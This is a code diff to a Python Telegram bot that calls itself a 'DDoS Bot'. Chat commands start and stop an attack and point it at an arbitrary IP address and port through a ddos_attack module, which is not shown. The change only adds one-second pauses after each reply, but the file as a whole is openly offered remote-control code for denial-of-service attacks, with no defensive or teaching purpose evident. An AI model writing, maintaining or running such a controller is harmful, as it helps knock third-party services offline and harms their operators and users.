@@ -58,32 +58,42 @@ def telegram_bot_start():
                     command_text = command["message"]["text"].split()
                     if command_text[0] == "/start":
                         send_message(chat_id, "DDoS Bot started. Type /help for commands.")
+                        time.sleep(1)
                     elif command_text[0] == "/help":
                         send_message(chat_id, "Available commands: /start, /attack, /stop, /change")
+                        time.sleep(1)
                     elif command_text[0] == "/attack":
                         try:
                             ddos_attack.start_attack()
                             send_message(chat_id, "Attack started.")
+                            time.sleep(1)
                         except Exception as e:
                             send_message(chat_id, f"Error starting attack: {e}")
+                            time.sleep(1)
                     elif command_text[0] == "/stop":
                         try:
                             ddos_attack.stop_attack()
                             send_message(chat_id, "Attack stopped.")
+                            time.sleep(1)
                         except Exception as e:
                             send_message(chat_id, f"Error stopping attack: {e}")
+                            time.sleep(1)
                     elif command_text[0] == "/change":
                         try:
                             new_ip = command_text[1]
                             new_port = int(command_text[2])
                             ddos_attack.change_target(new_ip, new_port)
                             send_message(chat_id, f"Target changed to {new_ip}:{new_port}")
+                            time.sleep(1)
                         except (IndexError, ValueError):
                             send_message(chat_id, "Invalid command. Use /change <new_ip> <new_port>")
+                            time.sleep(1)
                         except Exception as e:
                             send_message(chat_id, f"Error changing target: {e}")
+                            time.sleep(1)
                     else:
                         send_message(chat_id, "Unknown command. Type /help for available commands.")
+                        time.sleep(1)
             time.sleep(1)
         except Exception as e:
             logging.error(f"Error: {e}")
